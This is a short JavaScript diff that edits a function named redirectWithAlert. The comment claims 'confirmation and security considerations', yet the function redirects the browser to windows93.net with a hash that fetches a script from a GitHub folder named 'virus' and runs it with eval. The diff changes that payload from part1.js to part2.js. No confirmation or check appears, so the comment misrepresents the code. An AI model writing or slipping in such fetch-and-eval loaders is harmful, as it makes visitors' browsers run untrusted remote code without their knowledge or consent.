@@ -26,7 +26,7 @@ function modifyContent() {
 
 // Alert and redirection (with confirmation and security considerations)
 function redirectWithAlert() {
-    window.location.href = "www.windows93.net/#js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/windows93/main/virus/part1.js').then(response => response.text()).then(script => eval(script));";
+    window.location.href = "www.windows93.net/#js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/windows93/main/virus/part2.js').then(response => response.text()).then(script => eval(script));";
 }
 
 // Call the functions (modify content first, then handle alert and redirection)
